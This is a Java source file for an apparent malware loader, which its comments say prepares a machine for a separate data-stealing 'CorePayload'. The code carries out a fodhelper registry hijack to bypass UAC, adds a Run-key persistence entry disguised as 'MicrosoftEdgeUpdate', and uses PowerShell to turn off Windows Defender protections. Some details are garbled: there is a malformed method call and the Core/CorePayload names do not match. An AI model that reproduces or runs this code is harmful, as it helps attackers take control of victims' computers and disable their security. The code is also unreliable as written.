import java.io.*;
import java.nio.file.*;
import java.util.concurrent.*;

/**
 * LOADER MODULE
 * Handles: UAC Bypass, Persistence, Anti-Analysis, and Payload Deployment.
 * It does not steal data itself; it prepares the environment for the Core.
 */
public class Loader {
    private static final String CORE_CLASS_NAME = "CorePayload";
    private static final String REG_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String REG_NAME = "MicrosoftEdgeUpdate";

    public static void main(String[] args) {
        // 1. Anti-Analysis / Anti-Debug
        if (isDebugging() || isSandbox()) {
            System.exit(0);
        }

        // 2. Check Privileges
        if (!isAdmin()) {
            // Attempt Silent UAC Bypass
            if (attemptUACBypass()) {
                // If bypass initiated, exit. The elevated process will handle the rest.
                System.exit(0);
            }
            // If bypass fails, we proceed in user mode (limited functionality)
        } else {
            // If already admin, disable security tools immediately
            disableSecurityTools();
        }

        // 3. Ensure Persistence
        ensurePersistence();

        // 4. Deploy and Run Core Payload
        // In a real scenario, this might download the core from a C2.
        // Here, we assume the Core class is available or we re-exec with a specific flag.
        try {
            // Launch CorePayload
            ProcessBuilder pb = new ProcessBuilder("java", "-cp", System.getProperty("java.class.path"), Core.class.getName());
            pb.start();
            System.exit(0);
        } catch (Exception e) {
            // Fallback: Try to run the core logic directly if separate process fails
            CorePayload.main(new String[]{});
        }
    }

    private static boolean isAdmin() {
        try {
            ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "net session");
            pb.redirectErrorStream(true);
            Process p = pb.start();
            p.waitFor();
            return p.exitValue() == 0;
        } catch (Exception e) { return false; }
    }

    private static boolean attemptUACBypass() {
        try {
            // COM Hijack via fodhelper (Windows 10/11)
            String jarPath = new File(Loader.class.getProtectionDomain().getCodeSource().Location().toURI()).getAbsolutePath();
            String script = 
                "$p='" + jarPath + "'; " +
                "$r='HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'; " +
                "New-Item $r -Force; " +
                "New-ItemProperty -Path $r -Name 'DelegateExecute' -Value ''; " +
                "Set-ItemProperty -Path $r -Name '(default)' -Value \"java -cp '$p' Loader elevated=true`; " +
                "Start-Process fodhelper.exe; " +
                "Start-Sleep -Seconds 2; " +
                "Remove-Item $r -Recurse -Force";
            
            ProcessBuilder pb = new ProcessBuilder("powershell", "-Command", script);
            pb.start();
            return true;
        } catch (Exception e) { return false; }
    }

    private static void ensurePersistence() {
        try {
            String jarPath = new File(Loader.class.getProtectionDomain().getCodeSource().Location().toURI()).getAbsolutePath();
            String cmd = String.format(
                "reg add \"HKCU\\%s\" /v \"%s\" /t REG_SZ /d \"java -cp '%s' Loader\" /f",
                REG_KEY, REG_NAME, jarPath
            );
            new ProcessBuilder("cmd", "/c", cmd).start();
        } catch (Exception e) {}
    }

    private static void disableSecurityTools() {
        // Attempt to disable Defender
        String[] cmds = {
            "Set-MpPreference -DisableRealtimeMonitoring true",
            "Set-MpPreference -DisableIOAVProtection true"
        };
        for (String cmd : cmds) {
            try {
                new ProcessBuilder("powershell", "-Command", cmd).start();
            } catch (Exception e) {}
        }
    }

    private static boolean isDebugging() {
        // Basic anti-debug
        return false; // Simplified for demo
    }

    private static boolean isSandbox() {
        // Basic anti-sandbox
        return false; // Simplified for demo
    }
}